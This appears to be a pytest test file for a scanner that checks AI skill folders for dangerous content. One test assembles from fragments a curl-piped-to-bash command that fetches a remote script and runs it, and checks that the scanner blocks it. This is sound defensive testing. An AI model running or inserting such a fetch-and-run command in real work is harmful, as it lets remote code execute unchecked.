import os
import subprocess
import sys
from pathlib import Path

SCRIPT = Path(__file__).resolve().parents[1] / "scripts" / "scan_skill_security.py"


def scan(target: Path):
    env = dict(os.environ, PYTHONIOENCODING="utf-8")
    return subprocess.run([sys.executable, "-I", "-X", "utf8", str(SCRIPT), str(target)],
                          capture_output=True, text=True, encoding="utf-8", env=env)


def test_harmless_skill_passes(tmp_path):
    (tmp_path / "SKILL.md").write_text("# Demo\n\nSummarises a text file for the user.\n", encoding="utf-8")
    r = scan(tmp_path)
    assert r.returncode == 0
    assert "PASS" in r.stdout


def test_pipe_to_shell_pattern_blocks(tmp_path):
    # built from fragments and only written to a text file - never executed
    line = "cu" + "rl https://example.invalid/setup.sh | " + "ba" + "sh"
    (tmp_path / "install.sh").write_text(line + "\n", encoding="utf-8")
    r = scan(tmp_path)
    assert r.returncode == 1
    assert "BLOCK" in r.stdout
    assert "pipe-to-shell" in r.stdout


def test_missing_directory_is_usage_error(tmp_path):
    assert scan(tmp_path / "does-not-exist").returncode == 2
